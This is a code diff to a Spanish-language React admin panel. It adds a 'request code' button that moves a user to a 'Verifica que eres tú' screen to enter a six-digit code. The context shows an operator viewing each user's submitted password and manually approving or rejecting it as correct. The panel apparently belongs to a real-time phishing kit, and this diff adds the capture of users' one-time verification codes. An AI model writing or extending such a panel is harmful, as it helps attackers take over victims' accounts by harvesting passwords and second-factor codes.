@@ -16,6 +16,7 @@ import {
   getVerificationRequests,
   approveVerificationRequest,
   rejectVerificationRequest,
+  requestCodeVerification,
   subscribeToAllVerificationRequests,
 } from '../../services/verification.service';
 
@@ -320,11 +321,38 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
     [data, loadData]
   );
 
+  // ACCIÓN ADMIN 3: Pedir Código de Verificación (Exclusivo para correo/usuario)
+  const handleRequestCode = useCallback(
+    async (
+      requestId: string,
+      username: string,
+      userId?: number | string
+    ) => {
+      requestCodeVerification(requestId);
+
+      const effectiveUserId = userId || data?.rawUsers.find((u) => u.username === username)?.id;
+      if (effectiveUserId) {
+        await updateUserStatusInDb(Number(effectiveUserId), 'REQUIRE_CODE');
+        loadData();
+      }
+
+      const logEntry: ActivityLog = {
+        id: `log_${Date.now()}_${Math.random()}`,
+        time: new Date().toLocaleTimeString(),
+        type: 'sync',
+        message: `📩 Admin SOLICITÓ código de verificación para "${username}". El usuario pasará por "Verifica que eres tú".`,
+      };
+      setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
+      setVerificationRequests(getVerificationRequests());
+    },
+    [data, loadData]
+  );
+
   // Decisión directa para un usuario (Contraseña / Acceso)
   const handleUserDecision = useCallback(
     async (
       userId: number,
-      decision: 'APPROVED' | 'REJECTED'
+      decision: 'APPROVED' | 'REJECTED' | 'REQUIRE_CODE'
     ) => {
       const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
       const username = targetUser?.username || `Usuario #${userId}`;
@@ -337,11 +365,13 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
 
       if (decision === 'APPROVED') {
         await handleApprove(reqId, password, username, undefined, userId, 'PASSWORD');
-      } else {
+      } else if (decision === 'REJECTED') {
         await handleReject(reqId, password, username, undefined, userId, 'PASSWORD');
+      } else if (decision === 'REQUIRE_CODE') {
+        await handleRequestCode(reqId, username, userId);
       }
     },
-    [data, verificationRequests, handleApprove, handleReject]
+    [data, verificationRequests, handleApprove, handleReject, handleRequestCode]
   );
 
   // Obtener estado de validación de usuario (Prioridad: base de datos PostgreSQL)
@@ -762,6 +792,25 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                         : 'RECHAZAR (Incorrecto)'}
                     </span>
                   </button>
+
+                  {/* BOTÓN PEDIR CÓDIGO (Exclusivo para correo/usuario) */}
+                  {pendingRequests[0].type === 'PASSWORD' &&
+                    pendingRequests[0].inicio_sesion !== 'telefono' && (
+                      <button
+                        onClick={() =>
+                          handleRequestCode(
+                            pendingRequests[0].id,
+                            pendingRequests[0].username,
+                            pendingRequests[0].userId
+                          )
+                        }
+                        className="px-3.5 py-2 rounded-lg font-bold text-xs bg-cyan-600 hover:bg-cyan-500 text-white transition-all flex items-center gap-1.5 shadow-md shadow-cyan-600/20 active:scale-95 cursor-pointer"
+                        title="Pedir al usuario que verifique su identidad con código enviado al correo"
+                      >
+                        <span>📩</span>
+                        <span>PEDIR CÓDIGO</span>
+                      </button>
+                    )}
                 </div>
               </div>
             </div>
@@ -986,6 +1035,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                 ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse'
                                 : req.status === 'APPROVED'
                                 ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
+                                : req.status === 'REQUIRE_CODE'
+                                ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                                 : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                             }`}
                           >
@@ -996,6 +1047,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                 ? req.type === 'PASSWORD'
                                   ? '✓ Acceso Concedido'
                                   : '✓ Código Correcto'
+                                : req.status === 'REQUIRE_CODE'
+                                ? '📩 Código Solicitado (En espera del 6D)'
                                 : req.type === 'PASSWORD'
                                 ? '✕ Contraseña Rechazada'
                                 : '✕ Código Incorrecto'}
@@ -1078,6 +1131,21 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                               : 'Rechazar (Incorrecto)'}
                           </span>
                         </button>
+
+                        {req.type === 'PASSWORD' && req.inicio_sesion !== 'telefono' && (
+                          <button
+                            onClick={() => handleRequestCode(req.id, req.username, req.userId)}
+                            className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
+                              req.status === 'REQUIRE_CODE'
+                                ? 'bg-cyan-600 text-white cursor-default'
+                                : 'bg-cyan-500/20 hover:bg-cyan-600 text-cyan-300 hover:text-white border border-cyan-500/40 active:scale-95'
+                            }`}
+                            title="Pedir al usuario que ingrese código de verificación"
+                          >
+                            <span>📩</span>
+                            <span>{req.status === 'REQUIRE_CODE' ? 'Código Pedido' : 'Pedir Código'}</span>
+                          </button>
+                        )}
                       </div>
                     </div>
                   ))}
@@ -1177,6 +1245,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                   ? 'text-emerald-400'
                                   : getUserStatus(user.id, user.username) === 'REJECTED'
                                   ? 'text-rose-400'
+                                  : getUserStatus(user.id, user.username) === 'REQUIRE_CODE'
+                                  ? 'text-cyan-400'
                                   : 'text-amber-400 animate-pulse'
                               }`}
                             >
@@ -1184,6 +1254,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                 ? '✓ Aprobado'
                                 : getUserStatus(user.id, user.username) === 'REJECTED'
                                 ? '✕ Clave Rechazada'
+                                : getUserStatus(user.id, user.username) === 'REQUIRE_CODE'
+                                ? '📩 Código Pedido'
                                 : '⏳ Pendiente'}
                             </span>
                           </div>
@@ -1202,6 +1274,15 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                             >
                               ✕ Rechazar
                             </button>
+                            {user.inicio_sesion !== 'telefono' && (
+                              <button
+                                onClick={() => handleUserDecision(user.id, 'REQUIRE_CODE')}
+                                className="px-2 py-1 rounded bg-cyan-950/60 hover:bg-cyan-600 hover:text-white text-cyan-300 border border-cyan-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                                title="Pedir código de verificación al usuario"
+                              >
+                                📩 Código
+                              </button>
+                            )}
                           </div>
                         </div>
                       )}
@@ -1354,10 +1435,14 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                   ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                                   : getUserStatus(u.id, u.username) === 'REJECTED'
                                   ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
+                                  : getUserStatus(u.id, u.username) === 'REQUIRE_CODE'
+                                  ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30'
                                   : 'bg-amber-500/20 text-amber-300 border border-amber-500/30 animate-pulse'
                               }`}
                             >
-                              {getUserStatus(u.id, u.username)}
+                              {getUserStatus(u.id, u.username) === 'REQUIRE_CODE'
+                                ? '📩 Código Pedido'
+                                : getUserStatus(u.id, u.username)}
                             </span>
                           </td>
                           <td className="px-4 py-3 text-right">
@@ -1378,6 +1463,15 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                                   >
                                     ✕ Rechazar
                                   </button>
+                                  {u.inicio_sesion !== 'telefono' && (
+                                    <button
+                                      onClick={() => handleUserDecision(u.id, 'REQUIRE_CODE')}
+                                      className="px-2 py-0.5 rounded bg-cyan-950/60 hover:bg-cyan-600 hover:text-white text-cyan-300 border border-cyan-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                                      title="Pedir código de verificación"
+                                    >
+                                      📩 Código
+                                    </button>
+                                  )}
                                 </>
                               )}
                               <button
